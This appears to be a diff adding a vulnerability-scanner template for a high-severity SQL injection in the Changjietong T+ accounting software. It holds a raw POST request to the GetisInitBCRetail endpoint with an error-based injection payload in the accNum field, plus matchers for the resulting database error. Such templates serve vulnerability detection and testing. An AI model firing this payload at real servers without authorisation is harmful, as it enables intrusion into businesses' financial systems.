@@ -1,0 +1,28 @@
+id: changjietong-GetisInitBCRetail-sql
+
+info:
+  name: 畅捷通T+ GetisInitBCRetail SQL注入漏洞
+  author: changjietong
+  severity: high
+  tags: sql injection
+
+http:
+  - raw:
+      - |
+        POST /tplus/ajaxpro/Ufida.T.SM.UIP.Tool.AccountClearControler,Ufida.T.SM.UIP.ashx?method=GetisInitBCRetail HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
+        Content-Type: application/json
+
+        {"accNum":"1' AND 5227 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(112)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (5227=5227) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(107)+CHAR(120)+CHAR(113)))-- NCab"}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '转换成数据类型 int 时失败'
+          - 'qvpxq1qpkxq'
+        condition: and
+      - type: status
+        status: 
+          - 200
